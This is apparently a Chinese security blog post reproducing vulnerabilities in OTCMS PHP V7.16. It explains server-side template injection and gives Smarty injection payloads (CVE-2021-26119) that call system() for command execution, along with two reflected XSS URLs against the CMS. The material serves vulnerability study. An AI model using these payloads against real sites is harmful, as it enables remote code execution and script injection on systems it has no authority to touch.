#  网太CMS漏洞复现   
 进击的HACK   2024-11-15 23:55  
  
# 版本：OTCMS_PHP_V7.16  
  
搭建：http://m.otcms.com/news/8388.html  
## 漏洞1：SSTI   
  
**理解SSTI：**SSTI（服务器端模板注入），SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。  
  
**造成漏洞的主要成因：**render_template渲染函数在渲染的时候，对用户输入的变量不做渲染。  
  
**理解render_template渲染函数：**把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面。  
  
**SSTI漏洞原理：**服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.  
  
**注意：**这种模板不只存在于 Python 中，凡是使用模板的地方都可能会出现SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtw1naSZia2Sf3y1XZNuiaTr1GaM857YOJqiaov4HZDlCK9ffVV7pf0gceJw/640?wx_fmt=png&from=appmsg "")  
  
**常见的模版**  
  
**php**  
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">Smarty</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">很老的PHP模板引擎了，非常的经典，使用的比较广泛</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">Twig</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">来自于Symfony的模板引擎，易于安装和使用</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">Blade</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">Laravel 提供的一个既简单又强大的模板引擎</td></tr></tbody></table>  
  
**Java**  
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">JSP</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">经典</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">FreeMarker</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">一种基于模板和要改变的数据，并用来生成输出文本。一个Java类库，是一款程序员可以嵌入他们所开发产品的组件</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">Velocity</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">不仅可以替代JSP作为JavaWeb的服务端网页模板引擎，还可以作为普通文本的模板引擎来增强服务端程序文本处理能力</td></tr></tbody></table>  
  
**python**  
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">Jinja2</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: left;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">广泛</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">django</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">使用别的就不能发挥出 django 的特性了django 以快速开发著称，但</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">tornado</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;">tornado 强调的是异步非阻塞高并发</td></tr></tbody></table>  
### 漏洞分析  
  
功能点进行代码审计  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwiaiapto4K6VheA05PAnKN85kf6zzQEOjQia4VsoM3JPdh0C9a6iaSKoQibA/640?wx_fmt=png&from=appmsg "")  
  
  
抓包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtw1naSZia2Sf3y1XZNuiaTr1GaM857YOJqiaov4HZDlCK9ffVV7pf0gceJw/640?wx_fmt=png&from=appmsg "")  
  
  
打码审计  
  
添加、修改文件处对函数$fileContent没有进行SSTI漏洞限制，主要是对{{}}没有进行过滤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwDNxI51yUxNfcqZWBj1rnJRFedpP9a6NAAIMBzpXzW1RHztQibtMIxmg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwiatGvQC0BbSjOaTeoRmDsZn8HuWMw9IRRAIqQgAUpG7QhMKmZrzoCsg/640?wx_fmt=png&from=appmsg "")  
  
### 漏洞复现  
  
验证是否存在SSTI漏洞  
  
1、查看使用模版引擎是Smarty  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwvXmwcSv4iajkFqyhQXDdo27WNUibQBYY3qx3tVXJ7iaicXYY7vqASSv9Hw/640?wx_fmt=png&from=appmsg "")  
  
  
2、登录后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwO6Zl4Kvrq9aOJk7GZx0xoI2ZJM7AErx9JV0xKJxXORrgBhsd2xU0icQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwpxfCNoR7JJ74ZmoxiaOeVcib41ZOHLCG4VAHVL0WIxAkUb6SEpde3gJg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwGzibVzqJxybhoXuIj83j01tEkcsZuYfyrrxjagialwMJ8Xg8dz8Jzg2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwHafoQshULM5lbfZicNurc2YIfkg1sSb2SKejzuEyfHu8Mn691wrIBicA/640?wx_fmt=png&from=appmsg "")  
  
  
修改内容为  
```
{otcms:1*2}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwDHeKl5xKy33wL8RK905q8S1LnTDjladqlqwT4amECiaXfHPKgLQuRKw/640?wx_fmt=png&from=appmsg "")  
  
  
注入的表达式已经执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwgu5tOfBFWSBgnTwGr3ictLUaGcsY6vySpSV0icPL2TRY5ACibdG031Viaw/640?wx_fmt=png&from=appmsg "")  
  
  
查看Smarty的版本  
```
{otcms:version}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwZL2fbmSFz8dzOtJnIbwakNucwbmm3TX3GCVW5oIR0H6V9vk2KmCZ0w/640?wx_fmt=png&from=appmsg "")  
  
  
**注入poc**  
  
**详见：CVE-2021-26119**  
```
{otcms:$smarty.template_object->smarty->_getSmartyObj()->display('string:{otcms:system(calc)}')}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwQqvZEficLibUa2pFliax1JO110BCZoRiaibp6EMZoibH8ichAJMd120IncHicA/640?wx_fmt=png&from=appmsg "")  
  
  
**常见poc**  
```
string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCompileDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}

```  
## 漏洞二 ：xss漏洞   
### 在apiRun.php接口处存在xss漏洞  
  
定义变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwWArF71Dy3olhtd9UJvqc357cajAg5pllGaw9JahbpeDAAlTiafTjmTA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwKKTw7v3TmOuScWZuDuKGF9QJ6pKYxLZdfuuWtyZLAvaFMgRx3FHFDA/640?wx_fmt=png&from=appmsg "")  
  
  
**注入poc**  
```
apiRun.php?mode=";alert(1);//&mudi=autoRun
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwZIrOvHnfmMU5gEwlmUEqUVcIyBhYen9toibSfGRmFNKYVlcjNnq6zVw/640?wx_fmt=png&from=appmsg "")  
  
### 在inc\classAreaApp.php存在xss漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwd548OzXFJYfXyUnSISdzKKlcrBibmODzWIONxpTibSovaGffeX9ojyBQ/640?wx_fmt=png&from=appmsg "")  
  
  
**注入POC**  
```
http://www.otcms.com/wap/users/p.php?m=sendPhoneForm&dataID=7866&theme=1%22&_=1706170896361&type=%22%3E%3Cscript%3Ealert(1);%3C/script%3E

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7EOwrFI0GcKaa1No4RicNtwJ1koyWhrBoLfEruIZpGk3azegdcXBFmbM1XAYh5E31XWgUmhfJ0BXA/640?wx_fmt=png&from=appmsg "")  
  
  
参考文章：  
  
https://xz.aliyun.com/t/13432?time__1311=Gqmxu7G%3DH4lx0nD2DU2YoGC3D8Qn5fox#toc-7  
  
https://xz.aliyun.com/t/11108?time__1311=mqmx0DyDcDuGqq0vo4%2BxOD9WuKqDvN%2BQex&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F39303#toc-6  
  
  
